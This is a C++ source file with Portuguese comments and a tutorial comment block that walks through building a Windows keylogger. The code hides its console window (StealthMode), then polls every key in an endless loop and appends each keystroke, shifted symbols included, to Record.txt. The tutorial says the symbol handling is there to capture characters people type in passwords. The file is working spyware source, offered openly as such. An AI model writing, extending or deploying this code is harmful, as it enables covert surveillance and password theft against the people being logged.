/*
Biblioteca basica c++

<fstream> possibilita: Buffer de fluxo interno/ Executa operações de entrada/Saída no arquivo ao qual está associado
*/
#include <iostream>
#include <fstream>
/*
Biblioteca SO Windons

<windows.h> possibilita: Criar janelas e botões/ Enumerar arquivos de um diretório/
Consultar informações sobre o sistema(eg processos, serviços, janelas).

<winuser.h> possibilita: Troca de dados/ Caixa de diálogo/ Entrada de teclado e mouse
Gerenciador de janelas da área de trabalho(DWM)
*/
#include <windows.h>
#include <winuser.h>

using namespace std;

void StealthMode();
void StartLogging();

int main(){
    StealthMode();
    StartLogging();
    
    return 0;
}

void StartLogging(){
        char c;
    
    /*
    Os dois pontos e vírgulas entre parênteses especificam que o loop é infinito, ou seja, está configurado para ser executado continuamente sem cessar.
    */
    for(;;){
        
        /*
        loop aninhado cujas condições especificam o intervalo de caracteres que o programa poderá ler. Este intervalo de caracteres é obtido a partir dos códigos ASCII. Não é necessário carregar a tabela ASCII na cabeça, basta fazer referência a ela pela internet.
        */
        for(c=8;c<=222;c++){
            /*
            é uma declaração nova para nós, porém não é nada complexa. Isso é chamado de função de interrupção do sistema. O que ele simplesmente faz é observar se um usuário de computador digita alguma coisa em seu teclado.
            */
            if(GetAsyncKeyState(c)==-32767){
            
            /*
            entre parênteses, o aplicativo ios :: especifica que não queremos que nosso arquivo seja -escrito toda vez que alguém pressiona uma tecla. Se não especificarmos isso, cada vez que um usuário pressionar uma tecla, o arquivo será aberto novamente e tudo o que foi escrito anteriormente será sobrescrito pelo novo conteúdo.
            */
            ofstream write("Record.txt", ios::app);
            
            if(((c>64)&&(c<91))&&!(GetAsyncKeyState(0x10)) )
            {
                c+=32;
                write<<c;
                write.close();
                break;
            }
            else if((c>64)&&(c<91))
            {
                
                write<<c;
                write.close();
                break;
            }
            else {
                
                switch (c)
                {
                    case 48:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<")";
                        else
                            write<<"0";    
                        
                        
                        }   
                    break;
                    
                    
                    
                    case 49:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"!";
                        else
                            write<<"1";    
                        
                        
                        }   
                    break;
                    
                    case 50:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"@";
                        else
                            write<<"2";    
                        
                        }
                    break;
                    case 51:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"#";
                        else
                            write<<"3";    
                        
                        
                        }   
                    break;  
                    case 52:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"$";
                        else
                            write<<"4";    
                        
                        
                        }   
                    break;  
                    case 53:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"%";
                        else
                            write<<"5";    
                        
                        
                        }   
                    break;
                    case 54:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"^";
                        else
                            write<<"6";    
                        
                        
                        }   
                    break;
                    case 55:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"&";
                        else
                            write<<"7";    
                        
                        
                        }   
                    break;
                    case 56:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"*";
                        else
                            write<<"8";    
                        
                        
                        }   
                    break;
                    case 57:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"(";
                        else
                            write<<"9";    
                        
                        
                        }   
                    break;
                    
                    /*case VK_SPACE:
                        write<<" ";
                        break;
                    */
                    case VK_RETURN:
                        write<<"\n";
                        break;  
                    case VK_TAB:
                        write<<"  ";
                        break;
                   case VK_BACK:
                        write<<"<BACKSPACE>";
                        break;
                    case VK_DELETE:
                        write<<"<Del>";
                        break;  
                    
                    default:
                        write<<c;


                
            }
                
                }
           
           }
        }
        }
}

void StealthMode(){
    /*
     HWND -> representa uma janela para o sistema operacional e é um valor de ponteiro opaco. Ou seja, você pode saber o valor de um determinado HWND, mas não sabe nada sobre os dados que sustentam esse valor.

     declarando um identificador de janela.
     */
    HWND stealth;
    /*
    Um processo pode ser associado a apenas um console, portanto, a função AllocConsole falhará se o processo de chamada já tiver um console. Um processo pode usar a função FreeConsole para se desanexar do console atual. Depois, ele pode chamar AllocConsole para criar um console ou AttachConsole para se anexar a outro console.

    Aloca um novo console para o processo de chamada.
    */
    AllocConsole();
    /*
    Recupera um identificador para a janela de nível superior cujo nome de classe e nome da janela correspondem às strings especificadas. Esta função não pesquisa janelas filhas. Esta função não executa uma pesquisa com distinção entre maiúsculas e minúsculas.

    Encontre o identificador de janela com o nome de classe "ConsoleWindowClass".
    */
    stealth=FindWindowA("ConsoleWindowClass",NULL);
    /*

    Define o estado de exibição da janela especificada, e esconda isso.
    */
    ShowWindow(stealth,0);
    
}



/*
Leitura guiar para entendimento:

Dar função StartLogging() depois do inicio de acha ASCII

Vamos em frente e analisar o código da Linha 31 até a 43, pois é um bloco, que funciona em conjunto.
*Observe que Chave += 32 é equivalente a Chave = Chave + 32. O bloco de códigos exibido na figura acima é aquele criado com a finalidade de distinguir entre as letras maiúsculas e minúsculas. A linha 30 contém uma instrução if que basicamente diz: se o valor da chave for maior que 64 (todos os valores de ASCII
code), mas menor que 91 e a tecla shift não é pressionada (escrito como !(GetAsyncKey (0x10)) ) -onde 0x10 é a notação hexadecimal para a tecla Shift- adicione 32 aos valores-chave anteriores. É digno de nota que o intervalo de 64 a 91 dentro das declarações condicionais if não foi escolhido apenas aleatoriamente, mas intencionalmente devido ao fato de que as letras do alfabeto estão entre esse intervalo na tabela ASCII. Do recorte do código ASCII exibido na figura abaixo, fazendo um pouco de matemática, veremos por que escolhemos o número 32 para ser adicionado aos valores na chave dentro de nossa instrução condicional if na linha 31

Nossa declaração condicional if na linha 31estava: if key for maior que 64... this
significa que durante a avaliação, a chave será lida a partir do número 65. Agora observe o número 65 na tabela ASCII sob a coluna de caracteres. 65 representa a letra maiúscula A. Agora, se 32 for adicionado a 65, o resultado será 97. Dê uma olhada na coluna char do número 97 na tabela ASCII, o número 97 representa a letra minúscula a? Sim! Lembre-se que por padrão nosso programa Keylogger irá usar letras maiúsculas e como os códigos dentro da Linha 31 e 33, se a tecla shift não for pressionada (torna a letra maiúscula) então o valor 32 (que irá converter a letra para sua minúscula conforme definido pelo ASCII
tabela) deve ser adicionado. Agora sabemos por que 32 é o número escolhido para ser somado. Você pode ir em frente e escolher um número da tabela ASCII, que representa qualquer letra maiúscula, adicione 32 a esse número e veja se ele o leva à minúscula da mesma letra. A linha 34 mais próxima do arquivo: que na linha 35 é utilizada apenas para o teste, então não verificamos mais nada. Podemos removê-lo mais tarde, mas vamos ver como ele funciona em nosso programa pela primeira vez.

A figura abaixo mostra a saída do programa durante uma sessão de execução de teste: Aqui foi usado o prompt de comando (o Keylogger pode ser testado em qualquer lugar desde que as entradas sejam feitas) para testar o
programa e como você vê, funcionou. Observe também que o programa que acabamos de analisar era um para diferenciar entre as letras maiúsculas e minúsculas. Durante o teste acima, não foram dados espaços entre cada uma das palavras que escrevemos, isso porque usamos um line comment para excluir o aspecto do nosso código que contém os casos necessários para lidar com espaçamento e funções semelhantes e, portanto, se usássemos espaçamento, a forma de entrada ficaria em algum tipo de desordem. Nossa intenção básica aqui era tratar letras maiúsculas e minúsculas. apenas uma maneira de implementar a diferenciação entre as letras maiúsculas e minúsculas
existem várias maneiras de fazer isso. Alguns deles provavelmente são melhores que este, sinta-se à vontade para experimentar, pois isso ajudará a aprofundar seu conhecimento. FILTRANDO PERSONAGENS: Aqui, veremos como podemos filtrar todos os tipos de caracteres. Isso é importante, pois na maioria dos casos, as pessoas tendem a digitar certos caracteres como: asterisco, ponto de exclamação, símbolo de uma libra esterlina etc. como senhas e esses símbolos na maioria dos casos são obtidos pela combinação de duas ou mais teclas. A filtragem permitirá que nosso Keylogger reconheça quando essas teclas são pressionadas por um usuário. Precisamos lidar com essas coisas
no entanto, a grande questão é COMO? Bem, pense dessa maneira, o que você pressionará no teclado para obter o ponto de exclamação? Dependendo do teclado que você usa, no entanto para o ponto de exclamação é bastante universal;Shift 1 lhe dará isso. Precisamos fazer uma declaração, que reconhecerá o estado da tecla shift e se a tecla shift for pressionada e o valor, que se segue, for o valor ASCII do número 1 no teclado, por favor, não registre 1, registre “ponto de exclamação” em vez disso .Vamos resolver este problema. Utilizar apenas a instrução if não é a melhor maneira de resolver isso, mas usá-la
juntamente com a instrução switch é incrível, pois ajudará com melhor eficiência. Trazendo o restante dos códigos que escrevemos anteriormente, adicionando os códigos recentes exibidos na figura abaixo da Linha 43 para a Linha 50 dá ao nosso Keylogger o recurso de detectar entradas como o ponto de exclamação e outros símbolos que um usuário pode usar em sua senha.
Tendo descrito as funções dos códigos da Linha 35 até a 45 anteriormente e sendo que estamos acostumados com os códigos e como eles operam (Fundamentos de C++), talvez já tenhamos feito um bom palpite de como a parte do programa
acima funcionará. Bem, isso é bom, pois diz muito que somos melhores do que começamos e isso é ótimo! Bem, do código ASCII, o valor 49 na linha (47) representa o número 1. A linha 49 diz: se o shift key (descrita por 0x10 em formato hexadecimal) está interrompida, diga-nos isso. Além disso, como o programa tem o case 49 adicionado à sua lista, se o usuário digitar o número 1 em seu teclado imediatamente após a tecla shift ele enviará o símbolo de exclamação (!)

Conforme mostrado na figura acima, o Keylogger está sendo executado e testado utilizando as aspas além de uma pequena nota, que diz “Heythere” através da janela do prompt de comando para ver se ele reconhecerá o símbolo de exclamação e o enviará para nosso arquivo de projeto conforme o definimos (!) ou apenas nos dê alguns
outro resultado.

Agradável! Como visto acima na figura, nosso Keylogger agora escreve o ponto de exclamação para o que ele realmente é e não apenas uma figura engraçada * a declaração destacada é um trabalho testado anteriormente, não é parte integrante do resultado do teste recente. A partir deste ponto, nós apenas tem que continuar construindo no switch
declaração, adicionando mais e mais casos para representar todos os caracteres que queremos que nosso Keylogger seja capaz de interpretar. Isso nos permitirá personalizar nosso Keylogger para um teclado que geralmente gostamos, então mesmo que uma pessoa tenha suas teclas configuradas de forma diferente, isso afeta você, mas não muito. bloco de incorporação ao bloco de arquivamento etc. e unimos esses blocos com diferentes funções para cumprir um único propósito de um bom Keylogger. Agora vamos em frente com a incorporação do caso (filtragem)
e melhor disposição geral do código.

*/